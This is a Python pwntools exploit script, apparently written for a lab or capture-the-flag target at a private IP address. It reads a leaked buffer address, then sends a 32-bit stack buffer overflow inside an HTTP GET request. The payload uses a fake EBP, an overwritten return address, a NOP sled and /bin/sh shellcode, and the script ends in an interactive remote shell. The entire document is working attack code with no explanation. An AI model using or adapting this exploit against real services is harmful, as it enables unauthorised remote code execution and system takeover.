from pwn import *

global io
def sendcommand(cmd):
    
        io.sendline(cmd)
        output = io.recvline()
        if output:
            return output.decode()


def get_shellcode32():
    context.update(arch='i386',os='linux')
    return asm(shellcraft.sh())


io = remote("172.16.81.129",20000)
io.recvuntil("[debug] buffer is at ")
bufaddr = int(io.recvn(10).decode(),16)
io.recvline()
print(f"[+] buf address  ---> {hex(bufaddr)}\n ")

buf = cyclic(135)
ebp = p32(0xdeadbeef)
eip = p32(bufaddr + 135 + 0x4 + 0x8 )

print(f"eip ----> {eip}")
nop = b'\x90' * 20

shellcode = get_shellcode32()
#shellcode =b"".join(get_shellcode32())

#print(disasm(shellcode.encode()))
print(f"eip --> {eip} \n  ebp ---> {ebp}\n")
payload = [
    buf,
    ebp,
    eip,
    nop,
    shellcode
        ]

payload = b"".join(payload)

#cmd = b"GET /" + buf + ebp.decode() + eip.decode() + nop + shellcode +b" HTTP/1.1"
#print(io.sendline(cmd))
cmd = b"GET /" + payload+ b" HTTP/1.1"


io.sendline(cmd)
#print(io.recvline())
io.interactive()
